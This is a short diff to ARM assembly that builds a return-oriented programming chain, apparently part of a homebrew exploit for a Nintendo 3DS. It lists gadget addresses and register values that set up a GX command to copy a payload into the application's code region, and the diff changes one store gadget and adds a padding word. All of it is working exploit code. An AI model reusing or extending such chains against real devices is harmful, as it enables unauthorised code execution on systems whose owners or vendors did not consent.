@@ -58,7 +58,8 @@ secondaryROP:
 			.word CN_GSPHEAP+CN_TEXTPA_OFFSET_FROMEND+CN_INITIALCODE_OFFSET ; r4 (offset to dst from end of APPKICATION mem region)
 		.word 0x001e5ab0 ; add r0, r0, r4 | pop {r4, pc}
 			.word CN_HEAPPAYLOADADR+gxCommand+8-ROP ; r4 (location of dst field in GX command struct)
-		.word 0x0020096c ; ldr r0, [r4] | pop {r4, pc}
+		.word 0x0020096c ; str r0, [r4] | pop {r4, pc}
+			.word 0xDEADC0DE ; r4 (garbage)
 
 	;send GX command
 		.word 0x002d2b18 ; pop	{r0, pc}
